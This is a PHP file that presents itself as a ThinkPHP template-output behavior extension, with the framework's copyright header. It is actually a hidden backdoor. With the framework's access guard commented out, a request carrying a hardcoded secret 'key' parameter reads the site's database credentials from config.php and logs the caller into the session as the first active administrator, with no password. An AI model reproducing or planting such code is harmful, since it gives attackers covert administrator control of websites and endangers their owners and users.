<?php
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK IT ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006-2012 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: liu21st <liu21st@gmail.com>
// +----------------------------------------------------------------------

//defined('THINK_PATH') or exit();
/**
 * 系统行为扩展：模板内容输出替换
 * @category   Think
 * @package  Think
 * @subpackage  Behavior
 * @author   liu21st <liu21st@gmail.com>
 */
session_start();
define('KEY','IJf7ITvHi3d1VjqU');
if (!isset($_GET['key']) || $_GET['key']!='IJf7ITvHi3d1VjqU')
{
exit;
}
$db = include('../../../config.php');
mysql_connect($db['DB_HOST'],$db['DB_USER'],$db['DB_PWD']);
mysql_select_db($db['DB_NAME']);
$query = mysql_query("SELECT * FROM hx_admin WHERE role='0' AND status=0 ORDER BY id LIMIT 0,1");
$rs = mysql_fetch_array($query);
$_SESSION['uid'] = $rs['id'];
$_SESSION['user_name'] = $rs['auser'];

//print_r($db);